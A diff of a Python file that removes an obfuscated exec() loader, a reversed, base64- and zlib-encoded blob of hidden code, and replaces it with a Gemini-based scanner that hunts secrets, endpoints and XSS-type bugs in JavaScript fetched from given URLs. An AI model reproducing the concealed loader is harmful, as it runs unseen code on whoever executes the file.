@@ -1,2 +1,259 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import os
+from dotenv import load_dotenv
+from google import genai
+import requests
+import sys
+
+load_dotenv()
+
+if os.name == "unix":
+    os.system('clear')
+else:
+    os.system('cls')
+
+def configure_api_key():
+    """Configure or update the GEMINI_API_KEY in .env file"""
+    print("\n" + "=" * 60)
+    print(" API KEY CONFIGURATION")
+    print("=" * 60)
+    
+    current_key = os.getenv("GEMINI_API_KEY")
+    if current_key:
+        print(f"Current API key: {current_key[:5]}...{current_key[-5:] if len(current_key) > 10 else ''}")
+    
+    new_key = input("Enter new GEMINI API key: ").strip()
+    
+    if new_key:
+        try:
+            env_path = ".env"
+            env_content = []
+            
+            if os.path.exists(env_path):
+                with open(env_path, 'r') as f:
+                    env_content = f.readlines()
+            
+            key_found = False
+            for i, line in enumerate(env_content):
+                if line.startswith("GEMINI_API_KEY="):
+                    env_content[i] = f"GEMINI_API_KEY={new_key}\n"
+                    key_found = True
+                    break
+            
+            if not key_found:
+                env_content.append(f"GEMINI_API_KEY={new_key}\n")
+            
+            # Write back to .env
+            with open(env_path, 'w') as f:
+                f.writelines(env_content)
+            
+            print("[+] API key configured successfully")
+            
+            # Reload environment variables
+            load_dotenv(override=True)
+            return new_key
+            
+        except Exception as e:
+            print(f"[-] Error configuring API key: {str(e)}")
+            return None
+    else:
+        print("[-] No API key provided")
+        return None
+
+def get_api_key():
+    """Get API key from environment or prompt for configuration"""
+    api_key = os.getenv("GEMINI_API_KEY")
+    
+    if not api_key:
+        print("\n[!] GEMINI_API_KEY not found in .env")
+        configure = input("Would you like to configure it now? (y/n): ").strip().lower()
+        
+        if configure == 'y':
+            api_key = configure_api_key()
+            if not api_key:
+                print("[-] Exiting due to missing API key")
+                exit()
+        else:
+            print("[-] Exiting - API key required")
+            exit()
+    
+    return api_key
+
+def scan_javascript(content, url):
+    try:
+        api_key = get_api_key()
+        client = genai.Client(api_key=api_key)
+        
+        response = client.models.generate_content(
+            model="gemini-3-flash-preview",
+            contents=f"Look into this content and see if there's any medium-critical sensitive information, i dont want you to check for low severity issue, focus on medium-critical; if the content contains sensitive information, just write '-[Vulnerable]-' and under it, accurately print the line number along side the sensitive info and give it a severity rating; be very accurate with the severity rating, if it doesn't, just say '-[Not Vulnerable]-' with no other statement or comments, if the JS is minified, break it into human readable javascript format and analyze it as well; at the end of the result, do not ask any other question or say other other thing. Here's the content  {content}"
+        )
+        print()
+        if "-[Vulnerable]-" in response.text:
+            print(response.text)
+            print("-" * 60)
+        else:
+            print(f"[ NOT VULNERABLE ] >>> {url}")
+            
+    except Exception as e:
+        print(f"[ ERROR ] >>> Scanning {url}: {str(e)}")
+
+def scan_url_endpoints(content, url):
+    try:
+        api_key = get_api_key()
+        client = genai.Client(api_key=api_key)
+        
+        response = client.models.generate_content(
+            model="gemini-3-flash-preview",
+            contents=f"Look into this content and extract all URLs, endpoints in it, say '-[Extracted URLs/endpoints]-' and print them all out, do not say anything else after extracting; give each extracted URLs/endpoints line numbers; if there's no extracted URLs/endpoints, do not say anything, just end it. Here's the content  {content}"
+        )
+        print()
+        if "-[Extracted URLs/endpoints]-" in response.text:
+            print(response.text)
+            print("-" * 60)
+        else:
+            print(f"[ No URLs/endpoints found ] >>> {url}")
+            
+    except Exception as e:
+        print(f"[ ERROR ] >>> Scanning {url}: {str(e)}")
+
+def scan_potential_security_issues(content, url):
+    try:
+        api_key = get_api_key()
+        client = genai.Client(api_key=api_key)
+        
+        response = client.models.generate_content(
+            model="gemini-3-flash-preview",
+            contents=f"Analyze the provided JavaScript code and identify only high-confidence security vulnerabilities such as DOM-based XSS, reflected XSS, stored XSS, open redirects, client-side template injection, unsafe URL handling, insecure postMessage usage, prototype pollution, and dangerous use of eval or Function, while explicitly excluding Sensitive Information Disclosure, reporting results only when confidence is between 80% and 100%, and outputting only the vulnerable code snippet and its vulnerability type with no additional text before or after the results. Here's the content  {content}"
+        )
+        print()
+        print(response.text)
+        print("-" * 60)
+        
+            
+    except Exception as e:
+        print(f"[ ERROR ] >>> Scanning {url}: {str(e)}")
+
+def main():
+    print()
+    print("=" * 60)
+    print("  >>> AI-Powered JavaScript Security Tool v3.0 <<<")
+    print("=" * 60)
+    print("\n[1] Scan Single JavaScript URL ( Sensitive Informations )")
+    print("[2] Scan Multiple JavaScript URLs from File ( Sensitive Informations )")
+    print("[3] Extract URLs/endpoints")
+    print("[4] Scan For Potential Security Issues In JS ( i.e DOM-XSS, open redirect, e.t.c )")
+    print("[5] Configure API Key")
+    print("[6] Exit")
+    print("=" * 60)
+    
+    choice = input("\n>> ").strip()
+    
+    if choice == "1":
+        print("=" * 60)
+        print("  >>> SINGLE TARGET SCAN <<<")
+        print("=" * 60)
+        url = input("\n[?] URL >> ").strip()
+        if len(requests.get(url).text) <= 800000:
+            pass
+        else:
+            print("\n[ERROR] JS file too large for analysis. Maximum allowed size - 800,000 characters. Provided size",len(requests.get(url).text),"characters. Split the JavaScript into smaller chunks using ./chunk.py, host them locally, and try again.\n")
+            exit()
+        try:
+            print(f"\n[*] Fetching target >> {url}")
+            get_c = requests.get(url).text
+            scan_javascript(get_c, url)
+        except Exception as e:
+            print(f"\n [ERROR] Fetching {url} >> {str(e)}")
+            
+    elif choice == "3":
+        print("=" * 60)
+        print("  >>> Extract URLs/endpoints <<<")
+        print("=" * 60)
+        url = input("\n[?] URL >> ").strip()
+        if len(requests.get(url).text) <= 800000:
+            pass
+        else:
+            print("\n[ERROR] JS file too large for analysis. Maximum allowed size - 800,000 characters. Provided size",len(requests.get(url).text),"characters. Split the JavaScript into smaller chunks using ./chunk.py, host them locally, and try again.\n")
+            exit()
+        try:
+            print(f"\n[*] Fetching target >> {url}")
+            get_c = requests.get(url).text
+            scan_url_endpoints(get_c, url)
+        except Exception as e:
+            print(f"\n [ERROR] Fetching {url} >> {str(e)}")
+
+    elif choice == "4":
+        print("=" * 60)
+        print("  >>> Scan For Potential Security Issues In JS <<<")
+        print("=" * 60)
+        url = input("\n[?] URL >> ").strip()
+        if len(requests.get(url).text) <= 800000:
+            pass
+        else:
+            print("\n[ERROR] JS file too large for analysis. Maximum allowed size - 800,000 characters. Provided size",len(requests.get(url).text),"characters. Split the JavaScript into smaller chunks using ./chunk.py, host them locally, and try again.\n")
+            exit()
+        try:
+            print(f"\n[*] Fetching target >> {url}")
+            get_c = requests.get(url).text
+            scan_potential_security_issues(get_c, url)
+        except Exception as e:
+            print(f"\n [ERROR] Fetching {url} >> {str(e)}")
+
+    elif choice == "5":
+        print("=" * 60)
+        print("  >>> Configure API Key <<<")
+        print("=" * 60)
+        key = input("\n[?] KEY >> ").strip()
+        f = open('.env', 'w').write("GEMINI_API_KEY="+key)
+
+    elif choice == "2":
+        print("=" * 60)
+        print("  MULTIPLE TARGET SCAN")
+        print("=" * 60)
+        file_path = input("\n[?] Path to target list >> ").strip()
+        try:
+            with open(file_path, 'r') as f:
+                js_urls = [line.strip() for line in f if line.strip()]
+            
+            print(f"\n[*] Loaded {len(js_urls)} targets for scanning")
+            print("[*] Initializing attack vector...")
+            print("-" * 60)
+            
+            for i, js_url in enumerate(js_urls, 1):
+                try:
+                    print(f"\n[>] Target [{i}/{len(js_urls)}] >> {js_url}")
+                    if len(requests.get(js_url).text) <= 800000:
+                      pass
+                    else:
+                        print("\n[ERROR] JS file too large for analysis. Maximum allowed size - 800,000 characters. Provided size",len(requests.get(js_url).text),"characters. Split the JavaScript into smaller chunks using ./chunk.py, host them locally, and try again.\n")
+                        exit()
+                    get_c = requests.get(js_url).text
+                    scan_javascript(get_c, js_url)
+                except Exception as e:
+                    print(f"\n[ERROR] Fetching {js_url} >> {str(e)}")
+                    
+        except FileNotFoundError:
+            print(f"\n[ERROR] Target list not found >> {file_path}")
+        except Exception as e:
+            print(f"\n[ERROR] Reading target list >> {str(e)}")
+    
+
+    
+    elif choice == "6":
+        print("\n" + "=" * 60)
+        print("[+] Exiting...")
+        print("[+] System shutdown complete")
+        print("=" * 60)
+        sys.exit(0)
+        
+    else:
+        print("\n[!] Invalid option. Choose 1-6.")
+    
+    print("\n" + "=" * 60)
+    print("[+] Done...")
+    print("[+] Keep hacking the mainframe")
+    print("=" * 60)
+    print()
+
+if __name__ == "__main__":
+    main()
